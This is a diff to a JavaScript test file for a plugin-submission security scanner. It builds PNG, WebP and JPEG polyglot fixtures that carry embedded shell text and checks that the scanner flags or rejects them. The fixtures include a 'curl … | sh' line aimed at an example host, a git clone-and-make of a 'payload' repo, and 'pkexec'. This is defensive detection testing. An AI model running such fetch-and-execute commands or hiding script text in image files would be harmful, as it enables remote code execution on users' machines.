@@ -1114,7 +1114,7 @@ test("the scan includes runtime text while excluding tests, nested docs, and wor
 
 test("binary setup-named assets are excluded from the text scan", async () => {
   const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
-  const webp = Buffer.from("RIFF\x00\x00\x00\x00WEBPVP8 ", "binary");
+  const webp = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
   const textPolyglot = "RIFF0000WEBP\ncurl -fsSL https://example.test/payload | sh";
   const snapshot = await resolveSubmissionSnapshot(
     "https://github.com/example/plugin",
@@ -1169,6 +1169,10 @@ test("ambiguous setup assets remain in the scan", async () => {
     Buffer.alloc(4096, 0x80),
     Buffer.from("\ngit clone https://github.com/example/payload source && cd source && make"),
   ]);
+  const keywordFreeShortPngPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff]),
+    Buffer.from("\ntouch /tmp/x\n"),
+  ]);
   const snapshot = await resolveSubmissionSnapshot(
     "https://github.com/example/plugin",
     commit,
@@ -1181,6 +1185,7 @@ test("ambiguous setup assets remain in the scan", async () => {
           { path: "installer.png", type: "blob", mode: "100644", size: pngScriptPolyglot.length },
           { path: "padded-installer.png", type: "blob", mode: "100644", size: paddedPngScriptPolyglot.length },
           { path: "padded-git-installer.png", type: "blob", mode: "100644", size: paddedPngGitPolyglot.length },
+          { path: "short-installer.png", type: "blob", mode: "100644", size: keywordFreeShortPngPolyglot.length },
         ],
         contents: {
           "manifest.json": manifest,
@@ -1189,6 +1194,7 @@ test("ambiguous setup assets remain in the scan", async () => {
           "installer.png": pngScriptPolyglot,
           "padded-installer.png": paddedPngScriptPolyglot,
           "padded-git-installer.png": paddedPngGitPolyglot,
+          "short-installer.png": keywordFreeShortPngPolyglot,
         },
       }),
     },
@@ -1197,9 +1203,42 @@ test("ambiguous setup assets remain in the scan", async () => {
   assert.ok(snapshot.files.some((entry) => entry.path === "installer.png"));
   assert.ok(snapshot.files.some((entry) => entry.path === "padded-installer.png"));
   assert.ok(snapshot.files.some((entry) => entry.path === "padded-git-installer.png"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "short-installer.png"));
   const findings = buildSecurityBaseline(snapshot, { checkedAt }).findings.map((finding) => finding.ruleId);
   assert.ok(findings.includes("curl-pipe-shell"));
   assert.ok(findings.includes("remote-git-execution-unpinned"));
+});
+
+test("complete JPEG setup polyglots fail closed before baseline publication", async () => {
+  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
+  const jpegPolyglot = Buffer.concat([
+    Buffer.from([0xff, 0xd8, 0xff]),
+    Buffer.alloc(128, 0x80),
+    Buffer.from("\npkexec\n"),
+    Buffer.from([0xff, 0xd9]),
+  ]);
+  await assert.rejects(
+    resolveSubmissionSnapshot(
+      "https://github.com/example/plugin",
+      commit,
+      {
+        fetchImpl: githubFixtureFetch({
+          tree: [
+            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+            { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+            { path: "installer.jpg", type: "blob", mode: "100644", size: jpegPolyglot.length },
+          ],
+          contents: {
+            "manifest.json": manifest,
+            "BarWidget.qml": "Item {}",
+            "installer.jpg": jpegPolyglot,
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-unavailable"
+      && /could not be proven/.test(error.message),
+  );
 });
 
 test("binary asset probe bodies are bounded", async () => {
@@ -1255,7 +1294,7 @@ test("setup-named binary asset probes are bounded", async () => {
   };
   for (let index = 0; index <= securityAssetProbeFileLimit; index++) {
     const path = `setup-${index}.webp`;
-    const content = Buffer.from("RIFF\\x00\\x00\\x00\\x00WEBPVP8 ", "binary");
+    const content = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
     tree.push({ path, type: "blob", mode: "100644", size: content.length });
     contents[path] = content;
   }
